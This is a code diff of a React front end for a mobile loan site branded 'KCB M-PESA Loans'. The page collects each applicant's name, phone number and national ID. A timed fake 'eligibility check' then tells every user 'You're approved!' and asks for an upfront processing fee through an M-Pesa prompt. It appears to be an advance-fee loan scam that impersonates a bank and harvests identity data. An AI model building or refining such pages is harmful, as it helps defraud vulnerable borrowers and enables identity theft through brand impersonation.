-/* ══════════════════════════════════════════════════
-   DASHBOARD / LOAN GRID
-══════════════════════════════════════════════════ */
-.dash-header {
-  background: #fff;
-  padding: 20px 20px 0;
-  border-bottom: 1px solid #f0f0f0;
-  flex-shrink: 0;
-}
-.dash-top {
-  display: flex;
-  align-items: center;
-  justify-content: space-between;
-  margin-bottom: 16px;
-}
-.dash-greeting {
-  font-size: 15px;
-  font-weight: 700;
-  color: #111;
-}
-.dash-sub {
-  font-size: 12px;
-  color: #888;
-  margin-top: 1px;
-}
-.dash-avatar {
-  width: 40px;
-  height: 40px;
-  border-radius: 50%;
-  background: linear-gradient(135deg, #22c55e, #16a34a);
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  font-size: 15px;
-  font-weight: 800;
-  color: #fff;
-  flex-shrink: 0;
-}
-
-/* Ticker */
-.ticker-wrap {
-  background: #f9fafb;
-  border: 1px solid #e5e7eb;
-  border-radius: 10px;
-  padding: 10px 14px;
-  margin: 16px 20px;
-  display: flex;
-  align-items: center;
-  gap: 8px;
-  overflow: hidden;
-}
-.ticker-dot {
-  width: 8px;
-  height: 8px;
-  border-radius: 50%;
-  background: #22c55e;
-  flex-shrink: 0;
-  animation: tdot 1.4s ease-in-out infinite;
-}
-@keyframes tdot { 0%,100%{opacity:1}50%{opacity:.3} }
-.ticker-text {
-  font-size: 12px;
-  font-weight: 600;
-  color: #374151;
-  white-space: nowrap;
-  overflow: hidden;
-  text-overflow: ellipsis;
-}
-
-/* Loan grid */
-.loan-section-title {
-  font-size: 1.05rem;
-  font-weight: 800;
-  color: #111;
-  padding: 0 20px;
-  margin-bottom: 12px;
-}
-.loan-sub-title {
-  font-size: 12px;
-  color: #888;
-  padding: 0 20px;
-  margin-bottom: 16px;
-  margin-top: -8px;
-}
-.loan-grid {
-  display: grid;
-  grid-template-columns: 1fr 1fr;
-  gap: 10px;
-  padding: 0 20px;
-  margin-bottom: 100px;
-}
-.loan-card {
-  background: #fff;
-  border: 1.5px solid #e5e7eb;
-  border-radius: 14px;
-  padding: 16px 14px;
-  cursor: pointer;
-  transition: all .18s;
-  display: flex;
-  flex-direction: column;
-  gap: 4px;
-  position: relative;
-  overflow: hidden;
-}
-.loan-card::before {
-  content: '';
-  position: absolute;
-  top: 0;
-  left: 0;
-  right: 0;
-  height: 3px;
-  background: linear-gradient(90deg, #22c55e, #16a34a);
-  opacity: 0;
-  transition: opacity .18s;
-}
-.loan-card:hover {
-  border-color: #22c55e;
-  transform: translateY(-2px);
-  box-shadow: 0 8px 24px rgba(34,197,94,.14);
-}
-.loan-card:hover::before { opacity: 1; }
-.loan-card.selected {
-  border-color: #22c55e;
-  background: #f0fdf4;
-  box-shadow: 0 8px 28px rgba(34,197,94,.18);
-}
-.loan-card.selected::before { opacity: 1; }
-.loan-card.selected::after {
-  content: '✓';
-  position: absolute;
-  top: 8px;
-  right: 10px;
-  font-size: 13px;
-  font-weight: 900;
-  color: #22c55e;
-}
-.loan-amount {
-  font-size: 1.1rem;
-  font-weight: 900;
-  color: #111;
-  line-height: 1;
-}
-.loan-fee {
-  font-size: 11px;
-  color: #6b7280;
-  font-weight: 500;
-}
-.loan-repay {
-  font-size: 10px;
-  color: #9ca3af;
-  margin-top: 2px;
-}
-
-/* Fixed bottom bar on dashboard */
-.dash-bottom-bar {
-  position: fixed;
-  bottom: 0;
-  left: 50%;
-  transform: translateX(-50%);
-  width: 100%;
-  max-width: 420px;
-  background: #fff;
-  border-top: 1px solid #e5e7eb;
-  padding: 14px 20px 24px;
-  z-index: 30;
-}
-
-/* Security strip */
-.security-strip {
-  display: flex;
-  gap: 8px;
-  justify-content: center;
-  flex-wrap: wrap;
-  padding: 12px 20px;
-}
-.sec-pill {
-  background: #f9fafb;
-  border: 1px solid #e5e7eb;
-  border-radius: 99px;
-  padding: 5px 12px;
-  font-size: 11px;
-  font-weight: 600;
-  color: #374151;
-  display: flex;
-  align-items: center;
-  gap: 5px;
-}
-.sec-pill-dot {
-  width: 6px;
-  height: 6px;
-  border-radius: 50%;
-  background: #22c55e;
-  flex-shrink: 0;
-}
-
-/* ══════════════════════════════════════════════════
-   MODALS
-══════════════════════════════════════════════════ */
-.modal-bg {
-  position: fixed;
-  inset: 0;
-  z-index: 100;
-  background: rgba(0,0,0,.55);
-  backdrop-filter: blur(4px);
-  display: flex;
-  align-items: flex-end;
-  justify-content: center;
-  padding: 0;
-}
-@media (min-width: 480px) {
-  .modal-bg { align-items: center; padding: 20px; }
-}
-.modal-box {
-  background: #fff;
-  border-radius: 24px 24px 0 0;
-  width: 100%;
-  max-width: 420px;
-  max-height: 90vh;
-  overflow-y: auto;
-  animation: mUp .3s cubic-bezier(.34,1.2,.64,1);
-}
-@media (min-width: 480px) { .modal-box { border-radius: 24px; } }
-@keyframes mUp { from { transform: translateY(40px); opacity: 0; } to { transform: none; opacity: 1; } }
-
-/* Confirm modal */
-.modal-head {
-  padding: 28px 24px 0;
-  text-align: center;
-}
-.modal-doc-icon {
-  width: 68px;
-  height: 68px;
-  border-radius: 50%;
-  background: #f0fdf4;
-  border: 2px solid #bbf7d0;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  margin: 0 auto 14px;
-}
-.modal-doc-icon svg { width: 34px; height: 34px; stroke: #22c55e; fill: none; stroke-width: 1.8; stroke-linecap: round; stroke-linejoin: round; }
-.modal-title {
-  font-size: 1.2rem;
-  font-weight: 800;
-  color: #111;
-  margin-bottom: 20px;
-}
-.modal-details {
-  background: #f9fafb;
-  border-radius: 12px;
-  margin: 0 24px;
-  overflow: hidden;
-}
-.modal-row {
-  display: flex;
-  justify-content: space-between;
-  align-items: center;
-  padding: 13px 16px;
-  border-bottom: 1px solid #f0f0f0;
-}
-.modal-row:last-child { border-bottom: none; }
-.modal-key { font-size: 13px; color: #6b7280; font-weight: 500; }
-.modal-val { font-size: 14px; font-weight: 700; color: #111; }
-.modal-val.green { color: #22c55e; }
-.modal-phone-note {
-  text-align: center;
-  font-size: 13px;
-  color: #6b7280;
-  padding: 16px 24px 4px;
-  line-height: 1.5;
-}
-.modal-phone-num {
-  text-align: center;
-  font-size: 15px;
-  font-weight: 700;
-  color: #22c55e;
-  padding: 0 24px 20px;
-}
-.modal-actions {
-  padding: 0 24px 32px;
-  display: flex;
-  flex-direction: column;
-  gap: 10px;
-}
-.btn-modal-proceed {
-  width: 100%;
-  padding: 16px;
-  border: none;
-  border-radius: 12px;
-  background: #111;
-  color: #fff;
-  font-size: 15px;
-  font-weight: 800;
-  letter-spacing: .06em;
-  cursor: pointer;
-  transition: background .18s;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  gap: 8px;
-}
-.btn-modal-proceed:hover { background: #222; }
-.btn-modal-proceed:disabled { opacity: .45; cursor: not-allowed; }
-.btn-modal-cancel {
-  width: 100%;
-  padding: 14px;
-  border: 1.5px solid #e5e7eb;
-  border-radius: 12px;
-  background: #fff;
-  color: #6b7280;
-  font-size: 14px;
-  font-weight: 600;
-  cursor: pointer;
-  transition: all .18s;
-}
-.btn-modal-cancel:hover { border-color: #e53935; color: #e53935; }
-
-/* STK modal */
-.stk-modal-box {
-  background: #fff;
-  border-radius: 24px 24px 0 0;
-  width: 100%;
-  max-width: 420px;
-  padding: 36px 24px 40px;
-  animation: mUp .3s cubic-bezier(.34,1.2,.64,1);
-  text-align: center;
-}
-@media (min-width: 480px) { .stk-modal-box { border-radius: 24px; } }
-.stk-phone-icon {
-  width: 72px;
-  height: 72px;
-  border-radius: 50%;
-  background: #f0fdf4;
-  border: 2px solid #bbf7d0;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  margin: 0 auto 16px;
-}
-.stk-phone-icon svg { width: 36px; height: 36px; stroke: #22c55e; fill: none; stroke-width: 1.8; stroke-linecap: round; stroke-linejoin: round; }
-.stk-title { font-size: 1.25rem; font-weight: 800; color: #111; margin-bottom: 12px; }
-.stk-status-text {
-  font-size: 14px;
-  color: #6b7280;
-  line-height: 1.6;
-  background: #f9fafb;
-  border-radius: 10px;
-  padding: 12px 16px;
-  margin-bottom: 18px;
-}
-.stk-progress-wrap {
-  height: 4px;
-  background: #e5e7eb;
-  border-radius: 99px;
-  overflow: hidden;
-  margin-bottom: 16px;
-}
-.stk-progress-fill {
-  height: 100%;
-  background: linear-gradient(90deg, #22c55e, #16a34a);
-  border-radius: 99px;
-  animation: stk-anim 30s linear forwards;
-}
-@keyframes stk-anim { from { width: 0%; } to { width: 95%; } }
-.stk-verifying {
-  font-size: 15px;
-  font-weight: 700;
-  color: #111;
-  margin-bottom: 20px;
-}
-.stk-cancel {
-  background: none;
-  border: none;
-  cursor: pointer;
-  font-size: 12px;
-  color: #9ca3af;
-  text-decoration: underline;
-  margin-top: 4px;
-}
-
-/* ══════════════════════════════════════════════════
-   SUCCESS SCREEN
-══════════════════════════════════════════════════ */
-.success-wrap {
-  flex: 1;
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  padding: 32px 24px 40px;
-}
-.success-icon {
-  width: 88px;
-  height: 88px;
-  border-radius: 50%;
-  background: #f0fdf4;
-  border: 3px solid #22c55e;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  margin-bottom: 20px;
-  animation: popIn .55s cubic-bezier(.34,1.56,.64,1);
-}
-@keyframes popIn { from { transform: scale(0); opacity: 0; } to { transform: scale(1); opacity: 1; } }
-.success-icon svg { width: 44px; height: 44px; stroke: #22c55e; fill: none; stroke-width: 2.5; stroke-linecap: round; stroke-linejoin: round; }
-.success-title {
-  font-size: 1.45rem;
-  font-weight: 900;
-  color: #111;
-  margin-bottom: 8px;
-  text-align: center;
-}
-.success-sub {
-  font-size: 14px;
-  color: #6b7280;
-  text-align: center;
-  line-height: 1.65;
-  max-width: 300px;
-  margin: 0 auto 24px;
-}
-.success-amount-box {
-  width: 100%;
-  background: #f0fdf4;
-  border: 2px solid #bbf7d0;
-  border-radius: 16px;
-  padding: 22px;
-  text-align: center;
-  margin-bottom: 20px;
-}
-.success-amount {
-  font-size: 2.2rem;
-  font-weight: 900;
-  color: #111;
-  line-height: 1;
-}
-.success-amount-sub {
-  font-size: 13px;
-  color: #22c55e;
-  font-weight: 700;
-  margin-top: 6px;
-}
-.success-details {
-  width: 100%;
-  background: #f9fafb;
-  border-radius: 14px;
-  overflow: hidden;
-  margin-bottom: 24px;
-}
-.s-row {
-  display: flex;
-  justify-content: space-between;
-  align-items: center;
-  padding: 11px 16px;
-  border-bottom: 1px solid #f0f0f0;
-  font-size: 13px;
-}
-.s-row:last-child { border-bottom: none; }
-.s-key { color: #9ca3af; font-weight: 500; }
-.s-val { font-weight: 700; color: #111; }
+/* ── PHONE INPUT ── */
+.phone-modal-wrap{margin-bottom:14px}
+.phone-modal-inp{width:100%;background:#f8faf8;border:1.5px solid #e0ece0;border-radius:14px;padding:14px 16px;font-size:15px;color:#1a1a1a;outline:none;transition:border-color .18s;text-align:center;letter-spacing:.04em}
+.phone-modal-inp:focus{border-color:#1a7a3a;box-shadow:0 0 0 3px rgba(26,122,58,.10)}
+.phone-modal-inp.err{border-color:#e53935}
+.phone-err{font-size:11px;color:#e53935;text-align:center;margin-top:4px}
+.phone-hint{font-size:11px;color:#9aaa9a;text-align:center;margin-top:4px}
 `;
 
-/* ══════════════════════════════════════════════════
-   KORO LOGO SVG
-══════════════════════════════════════════════════ */
-function KoroLogo({ size = 72, white = false }) {
-  const green  = white ? "#fff" : "#22c55e";
-  const dark   = white ? "#fff" : "#111";
+/* ══════════════════════════════════════════════════════════════
+   COMPONENTS
+══════════════════════════════════════════════════════════════ */
 
-  return (
-    <svg width={size} height={size} viewBox="0 0 80 80" fill="none" xmlns="http://www.w3.org/2000/svg">
-      {/* Small dot above */}
-      <circle cx="40" cy="6" r="4" fill={green} />
-      {/* Main K-person figure */}
-      {/* Head */}
-      <circle cx="40" cy="20" r="8" fill={green} />
-      {/* Body — leaning forward K shape */}
-      <path d="M28 38 Q32 28 40 30 Q50 32 52 26" stroke={dark} strokeWidth="4" strokeLinecap="round" fill="none"/>
-      {/* Left leg */}
-      <path d="M36 55 L30 72" stroke={dark} strokeWidth="4.5" strokeLinecap="round"/>
-      {/* Right leg */}
-      <path d="M36 55 L46 72" stroke={dark} strokeWidth="4.5" strokeLinecap="round"/>
-      {/* Torso */}
-      <path d="M36 32 L36 56" stroke={dark} strokeWidth="4.5" strokeLinecap="round"/>
-      {/* Right arm (upper) */}
-      <path d="M36 40 L56 30" stroke={dark} strokeWidth="4" strokeLinecap="round"/>
-      {/* Right arm (lower) */}
-      <path d="M36 40 L56 50" stroke={green} strokeWidth="4" strokeLinecap="round"/>
-    </svg>
-  );
-}
-
-/* ══════════════════════════════════════════════════
-   TICKER
-══════════════════════════════════════════════════ */
-function Ticker() {
+/* Animated ticker */
+function Ticker({ items }) {
   const [idx, setIdx] = useState(0);
   useEffect(() => {
-    const iv = setInterval(() => setIdx(i => (i + 1) % RECENT.length), 3500);
+    const iv = setInterval(() => setIdx(i => (i + 1) % items.length), 4000);
     return () => clearInterval(iv);
-  }, []);
+  }, [items.length]);
   return (
     <div className="ticker-wrap">
-      <div className="ticker-dot" />
-      <div className="ticker-text">{RECENT[idx]}</div>
+      <span className="ticker-icon">...</span>
+      <span className="ticker-text">{items[idx]}</span>
     </div>
   );
 }
 
-/* ══════════════════════════════════════════════════
-   ID CARD ILLUSTRATION
-══════════════════════════════════════════════════ */
-function KenyaIDCard({ highlightName = false, highlightId = false }) {
+/* ── SCREEN 1: HERO ── */
+function HeroScreen({ onStart }) {
   return (
-    <div className="id-card-img">
-      <div className="id-card-inner">
-        <div className="id-header">
-          <span>JAMHURI YA KENYA</span>
-          <span>REPUBLIC OF KENYA</span>
-        </div>
-        <div style={{ fontSize: 9, color: "#1a3a1a", marginBottom: 6 }}>
-          SERIAL NUMBER: 231434590
-          <span style={{ float: "right" }}>
-            ID NUMBER{" "}
-            <span className={highlightId ? "id-highlight" : ""}>
-              11111111
-            </span>
+    <div style={{ background: "#f9fafb", minHeight: "100vh" }}>
+
+      {/* HEADER */}
+      <div style={{
+        display: "flex",
+        justifyContent: "space-between",
+        alignItems: "center",
+        padding: "16px 24px",
+        background: "#fff",
+        borderBottom: "1px solid #eee"
+      }}>
+        <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
+          <img src="/kcb-hero.png" style={{ width: 40 }} />
+          <span style={{ fontWeight: 600, fontSize: 16 }}>
+            M-PESA Loans
           </span>
         </div>
-        <div className="id-row">
-          <div className="id-photo">
-            <svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
-          </div>
-          <div className="id-details">
-            <div style={{ fontSize: 9, color: "#555", marginBottom: 1 }}>FULL NAMES</div>
-            <div className={highlightName ? "id-highlight name-hl" : ""} style={{ fontWeight: 700, fontSize: 11, marginBottom: 8 }}>
-              ALMASI ACHIENG ALUOCH
-            </div>
-            <div>DATE OF BIRTH: 08.01.1994</div>
-            <div>SEX: MALE</div>
-            <div>DISTRICT OF BIRTH: NAIROBI</div>
-            <div>PLACE OF ISSUE: WESTLANDS</div>
-            <div>DATE OF ISSUE: 20.05.2010</div>
-          </div>
-        </div>
-        <div className="id-stamp">Example</div>
-        <div className="id-fingerprint">
-          <svg viewBox="0 0 60 60" fill="none">
-            <ellipse cx="30" cy="30" rx="22" ry="26" stroke="#666" strokeWidth="1.2" opacity=".4"/>
-            <ellipse cx="30" cy="30" rx="15" ry="18" stroke="#666" strokeWidth="1.2" opacity=".4"/>
-            <ellipse cx="30" cy="30" rx="9"  ry="11" stroke="#666" strokeWidth="1.2" opacity=".4"/>
-            <ellipse cx="30" cy="30" rx="4"  ry="5"  stroke="#666" strokeWidth="1.2" opacity=".4"/>
-          </svg>
-        </div>
-      </div>
-    </div>
-  );
-}
 
-/* ══════════════════════════════════════════════════
-   CONFIRM MODAL
-══════════════════════════════════════════════════ */
-function ConfirmModal({ loan, userData, onProceed, onCancel }) {
-  return (
-    <div className="modal-bg" onClick={onCancel}>
-      <div className="modal-box" onClick={e => e.stopPropagation()}>
-        <div className="modal-head">
-          <div className="modal-doc-icon">
-            <svg viewBox="0 0 24 24">
-              <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/>
-              <polyline points="14 2 14 8 20 8"/>
-              <line x1="16" y1="13" x2="8" y2="13"/>
-              <line x1="16" y1="17" x2="8" y2="17"/>
-              <polyline points="10 9 9 9 8 9"/>
-            </svg>
+        <span style={{ fontSize: 14, color: "#6b7280" }}>Help</span>
+      </div>
+
+
+      {/* HERO */}
+      <div style={{
+        display: "flex",
+        alignItems: "center",
+        justifyContent: "space-between",
+        padding: "60px 80px",
+        gap: 40
+      }}>
+
+        {/* LEFT */}
+        <div style={{ maxWidth: 500 }}>
+          <h1 style={{
+            fontSize: 42,
+            fontWeight: 800,
+            color: "#1f3b73",
+            lineHeight: 1.2
+          }}>
+            Get Up To <span style={{ color: "#dc2626" }}>Ksh 100,000</span>
+          </h1>
+
+          <p style={{
+            marginTop: 14,
+            fontSize: 16,
+            color: "#6b7280"
+          }}>
+            Low 5.5% interest rate for qualified borrowers
+          </p>
+
+          <div style={{
+            display: "flex",
+            gap: 20,
+            marginTop: 20,
+            marginBottom: 20
+          }}>
+            {["Apply", "Approve", "Receive"].map((t, i) => (
+              <div key={i} style={{ display: "flex", alignItems: "center", gap: 8 }}>
+                <div style={{
+                  width: 28,
+                  height: 28,
+                  borderRadius: "50%",
+                  background: "#1f3b73",
+                  color: "#fff",
+                  display: "flex",
+                  alignItems: "center",
+                  justifyContent: "center",
+                  fontSize: 13
+                }}>
+                  {i + 1}
+                </div>
+                <span style={{ fontSize: 14 }}>{t}</span>
+              </div>
+            ))}
           </div>
-          <div className="modal-title">Confirm Loan Application</div>
-        </div>
-        <div className="modal-details">
-          <div className="modal-row">
-            <span className="modal-key">Loan Amount:</span>
-            <span className="modal-val green">Ksh {fmt(loan.amount)}</span>
-          </div>
-          <div className="modal-row">
-            <span className="modal-key">Processing Fee:</span>
-            <span className="modal-val">Ksh {fmt(loan.fee)}</span>
-          </div>
-          <div className="modal-row">
-            <span className="modal-key">Total Repayment:</span>
-            <span className="modal-val">Ksh {fmt(loan.repayment)}</span>
-          </div>
-        </div>
-        <div className="modal-phone-note">
-          An M-Pesa prompt will be sent to complete your application
-        </div>
-        <div className="modal-phone-num">Phone: {userData.phone}</div>
-        <div className="modal-actions">
-          <button className="btn-modal-proceed" onClick={onProceed}>
-            Pay Processing Fee &amp; Proceed
+
+          <button
+            onClick={onStart}
+            style={{
+              background: "#dc2626",
+              color: "#fff",
+              padding: "14px 22px",
+              borderRadius: 8,
+              border: "none",
+              fontWeight: 700,
+              fontSize: 15,
+              cursor: "pointer"
+            }}
+          >
+            Apply Now
           </button>
-          <button className="btn-modal-cancel" onClick={onCancel}>Cancel</button>
         </div>
+
+
+        {/* RIGHT */}
+        <div style={{ position: "relative" }}>
+          <img
+            src="/kcb-hero.png"
+            style={{
+              width: 420,
+              borderRadius: 20
+            }}
+          />
+
+          {/* FLOAT CARD */}
+          <div style={{
+            position: "absolute",
+            bottom: -20,
+            left: 20,
+            right: 20,
+            background: "#fff",
+            borderRadius: 14,
+            padding: "14px 18px",
+            display: "flex",
+            justifyContent: "space-between",
+            boxShadow: "0 10px 30px rgba(0,0,0,0.1)"
+          }}>
+            <div>
+              <strong>Ksh 100K</strong>
+              <div style={{ fontSize: 12, color: "#6b7280" }}>Max Amount</div>
+            </div>
+
+            <div>
+              <strong style={{ color: "#dc2626" }}>5.5%</strong>
+              <div style={{ fontSize: 12, color: "#6b7280" }}>Interest</div>
+            </div>
+
+            <div>
+              <strong style={{ color: "#16a34a" }}>3 Steps</strong>
+              <div style={{ fontSize: 12, color: "#6b7280" }}>Process</div>
+            </div>
+          </div>
+        </div>
+
+      </div>
+
+
+      {/* FEATURES */}
+      <div style={{
+        display: "flex",
+        gap: 20,
+        padding: "40px 80px"
+      }}>
+        {[
+          ["Quick Approval", "Get pre-approved in minutes"],
+          ["Flexible Terms", "Choose 30–90 days"],
+          ["No Hidden Fees", "Transparent pricing"]
+        ].map(([title, desc]) => (
+          <div key={title} style={{
+            flex: 1,
+            background: "#fff",
+            padding: 20,
+            borderRadius: 12,
+            textAlign: "center",
+            boxShadow: "0 2px 10px rgba(0,0,0,0.05)"
+          }}>
+            <div style={{ fontWeight: 700 }}>{title}</div>
+            <div style={{ fontSize: 13, color: "#6b7280", marginTop: 6 }}>
+              {desc}
+            </div>
+          </div>
+        ))}
+      </div>
+
+    </div>
+  );
+}
+
+function LoadingScreen() {
+  return (
+    <div style={{
+      position: "fixed",
+      inset: 0,
+      background: "#0f172a",
+      color: "#fff",
+      display: "flex",
+      flexDirection: "column",
+      alignItems: "center",
+      justifyContent: "center",
+      zIndex: 999
+    }}>
+      <div className="loader-circle" />
+
+      <p style={{ marginTop: 20, fontSize: 14 }}>
+        Checking eligibility...
+      </p>
+    </div>
+  );
+}
+
+
+
+
+
+
+
+/* ── SCREEN 2: ELIGIBILITY FORM ── */
+function EligibilityScreen({ onNext }) {
+  const [form, setForm] = useState({
+    name: "",
+    phone: "",
+    id: "",
+    loanType: ""
+  });
+const [errs, setErrs] = useState({
+  name: "",
+  phone: "",
+  id: "",
+  loanType: ""
+});
+  const [loading, setLoading] = useState(false);
+const [loadingScreen, setLoadingScreen] = useState(false);
+
+const submit = async () => {
+  const e = validate();
+
+  if (Object.values(e).some(v => v)) {
+    setErrs(e);
+    return;
+  }
+
+  setLoadingScreen(true);
+
+  setTimeout(() => {
+    setLoadingScreen(false);
+    onNext({
+      ...form,
+      phone: normalisePhone(form.phone)
+    });
+  }, 2500);
+};
+
+
+
+
+  const update = (key, value) => {
+    setForm(prev => ({ ...prev, [key]: value }));
+
+    // clear error instantly when user edits
+    setErrs(prev => ({ ...prev, [key]: "" }));
+  };
+
+  const validate = () => {
+    const e = {
+  name: "",
+  phone: "",
+  id: "",
+  loanType: ""
+};
+    if (!form.name.trim()) {
+      e.name = "Enter your full name";
+    }
+
+    if (!isValidPhone(form.phone)) {
+      e.phone = "Enter valid Safaricom number (07, 01, or 254...)";
+    }
+
+    if (!/^\d{7,9}$/.test(form.id)) {
+      e.id = "Enter valid ID (7–9 digits)";
+    }
+
+    if (!form.loanType) {
+      e.loanType = "Select loan type";
+    }
+
+    return e;
+  };
+
+
+  return (
+    <>
+      {/* TOP BAR */}
+      {loadingScreen && <LoadingScreen />}
+      <div style={topBar}>
+        <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
+          ←
+          <strong>KCB M-PESA Loans</strong>
+        </div>
+        <span style={{ fontSize: 12 }}>Help</span>
+      </div>
+
+      {/* FORM */}
+      <div style={container}>
+        <div style={card}>
+
+          <h2 style={title}>M-PESA INFORMATION</h2>
+          <p style={subtitle}>Fill in your details to check eligibility</p>
+
+          {/* NAME */}
+          <label style={label}>Full Name</label>
+          <input
+            type="text"
+            placeholder="Enter your full name"
+            value={form.name}
+            onChange={e => update("name", e.target.value)}
+            style={inputStyle(errs.name)}
+          />
+          {errs.name && <small style={errStyle}>{errs.name}</small>}
+
+          {/* PHONE */}
+          <label style={label}>Phone Number</label>
+          <input
+            type="tel"
+            placeholder="0712345678"
+            value={form.phone}
+            onChange={e =>
+              update("phone", e.target.value.replace(/\D/g, ""))
+            }
+            style={inputStyle(errs.phone)}
+          />
+          <small style={hint}>Safaricom line required</small>
+          {errs.phone && <small style={errStyle}>{errs.phone}</small>}
+
+          {/* ID */}
+          <label style={label}>National ID</label>
+          <input
+            type="text"
+            placeholder="7 to 9 digits"
+            value={form.id}
+            onChange={e =>
+              update("id", e.target.value.replace(/\D/g, ""))
+            }
+            style={inputStyle(errs.id)}
+          />
+          {errs.id && <small style={errStyle}>{errs.id}</small>}
+
+          {/* SELECT */}
+          <label style={label}>Loan Type</label>
+          <select
+            value={form.loanType}
+            onChange={e => update("loanType", e.target.value)}
+            style={inputStyle(errs.loanType)}
+          >
+            <option value="">Select loan type</option>
+            {LOAN_TYPES.map(l => (
+              <option key={l}>{l}</option>
+            ))}
+          </select>
+          {errs.loanType && <small style={errStyle}>{errs.loanType}</small>}
+
+          {/* BUTTON */}
+          <button
+            onClick={submit}
+            disabled={loading}
+            style={btn}
+          >
+            {loading ? "Checking..." : "Check Eligibility"}
+          </button>
+
+        </div>
+      </div>
+
+      {/* FOOTER */}
+      <div style={footer}>
+        <span>Privacy</span>
+        <span>Terms</span>
+        <span>Contact</span>
+      </div>
+    </>
+  );
+}
+
+
+/* ── STYLES ── */
+const topBar = {
+  display: "flex",
+  justifyContent: "space-between",
+  padding: "14px 16px",
+  background: "#fff",
+  borderBottom: "1px solid #eee"
+};
+
+const container = {
+  display: "flex",
+  justifyContent: "center",
+  padding: "30px 16px"
+};
+
+const card = {
+  width: "100%",
+  maxWidth: 520,
+  background: "#fff",
+  borderRadius: 16,
+  padding: "28px 22px",
+  boxShadow: "0 10px 30px rgba(0,0,0,0.08)"
+};
+
+const title = {
+  textAlign: "center" as const,
+  fontWeight: 800,
+  color: "#1f3b73",
+  marginBottom: 6
+};
+const subtitle = {
+  textAlign: "center" as const,
+  fontSize: 13,
+  color: "#6b7280",
+  marginBottom: 20
+};
+
+const label = {
+  fontSize: 13,
+  fontWeight: 600
+};
+
+const hint = {
+  fontSize: 11,
+  color: "#9ca3af"
+};
+
+const btn = {
+  width: "100%",
+  background: "#dc2626",
+  color: "#fff",
+  padding: "14px",
+  border: "none",
+  borderRadius: 10,
+  fontWeight: 700,
+  cursor: "pointer"
+};
+
+const inputStyle = (err) => ({
+  width: "100%",
+  padding: "12px",
+  marginTop: 6,
+  marginBottom: 12,
+  borderRadius: 8,
+  border: err ? "1.5px solid red" : "1.5px solid #e5e7eb",
+  outline: "none",
+  fontSize: 14
+});
+
+const errStyle = {
+  color: "red",
+  fontSize: 11,
+  marginTop: -8,
+  display: "block",
+  marginBottom: 8
+};
+const footer = {
+  background: "#1f3b73",
+  color: "#fff",
+  padding: "14px",
+  fontSize: 12,
+  display: "flex",
+  justifyContent: "space-between"
+};
+
+
+
+
+function LoanGridScreen({ userData, onSelect }) {
+  return (
+    <>
+      <div className="topbar">
+        <div className="logo-pill">
+          <span className="logo-text">KCB M-PESA Loans</span>
+        </div>
+      </div>
+
+
+      <div style={{ padding: "24px 16px 10px" }}>
+  <div style={{ textAlign: "center", marginBottom: 10 }}>
+    <div style={{
+      width: 60,
+      height: 60,
+      borderRadius: "50%",
+      background: "#e6f4ea",
+      display: "flex",
+      alignItems: "center",
+      justifyContent: "center",
+      margin: "0 auto 10px",
+      fontSize: 26
+    }}>
+      ✅
+    </div>
+
+    <h2 style={{
+      fontSize: 22,
+      fontWeight: 700,
+      color: "#1f3b73",
+      marginBottom: 4
+    }}>
+      You're approved!
+    </h2>
+
+    <p style={{
+      fontSize: 14,
+      color: "#6b7280"
+    }}>
+      Great news, <b>{userData.name}</b>! Pick the loan amount that works best for you.
+    </p>
+
+    <p style={{
+      fontSize: 12,
+      color: "#9ca3af",
+      marginTop: 6
+    }}>
+      5 loan types available
+    </p>
+  </div>
+</div>
+
+
+
+
+
+      
+
+      {LOAN_GROUPS.map((group, idx) => (
+        <div key={idx} style={{ padding: "10px 16px" }}>
+
+<div style={{
+  display: "flex",
+  alignItems: "center",
+  gap: 6,
+  marginBottom: 10
+}}>
+  <div style={{
+    width: 3,
+    height: 16,
+    background: "#1f3b73",
+    borderRadius: 2
+  }} />
+
+  <h4 style={{
+    fontSize: 16,
+    fontWeight: 600,
+    color: "#1f3b73"
+  }}>
+    {group.title}
+  </h4>
+
+  <span style={{
+    fontSize: 12,
+    color: "#9ca3af"
+  }}>
+    {group.title.includes("Personal") && "Flexible loans for personal needs"}
+    {group.title.includes("Business") && "Grow your business"}
+    {group.title.includes("Education") && "Invest in your future"}
+    {group.title.includes("Emergency") && "Quick emergency funds"}
+    {group.title.includes("Home") && "Upgrade your home"}
+  </span>
+</div>
+
+
+
+         
+          <div style={{
+            display: "grid",
+            gridTemplateColumns: "1fr 1fr",
+            gap: 10
+          }}>
+            {group.items.map((loan) => (
+              <div
+  key={loan.amount}
+  style={{
+    background: "#fff",
+    padding: 16,
+    borderRadius: 14,
+    border: "1px solid #e5e7eb",
+    boxShadow: "0 2px 8px rgba(0,0,0,0.04)",
+    textAlign: "center"
+  }}
+>
+  <div style={{
+    fontWeight: 700,
+    fontSize: 16,
+    color: "#1f3b73"
+  }}>
+    KSh {fmt(loan.amount)}
+  </div>
+
+  <div style={{
+    fontSize: 12,
+    color: "#6b7280",
+    marginTop: 4
+  }}>
+    Repay over 6 months
+  </div>
+
+  <div style={{
+    fontSize: 12,
+    color: "#f97316",
+    marginTop: 4,
+    fontWeight: 500
+  }}>
+    Fee: KSh {fmt(loan.fee)}
+  </div>
+
+  <button
+    onClick={() => onSelect(loan)}
+    style={{
+      marginTop: 12,
+      width: "100%",
+      padding: "10px 0",
+      borderRadius: 10,
+      border: "none",
+      background: "#f3f4f6",
+      fontWeight: 700,
+      fontSize: 13,
+      color: "#374151",
+      cursor: "pointer"
+    }}
+  >
+    SELECT
+  </button>
+</div>
+            ))}
+          </div>
+        </div>
+      ))}
+    </>
+  );
+}
+
+
+
+
+/* ── MODAL: CONFIRM LOAN APPLICATION ── */
+function ConfirmScreen({ loan, userData, onApply, onBack }) {
+  const interest = Math.round(loan.amount * 0.088);
+  const total = loan.amount + loan.fee + interest;
+
+  const normPhone = normalisePhone(userData.phone) || userData.phone;
+
+  return (
+    <div style={{ padding: 16 }}>
+      
+      <div style={{ marginBottom: 10, cursor: "pointer" }} onClick={onBack}>
+        ← Back to offers
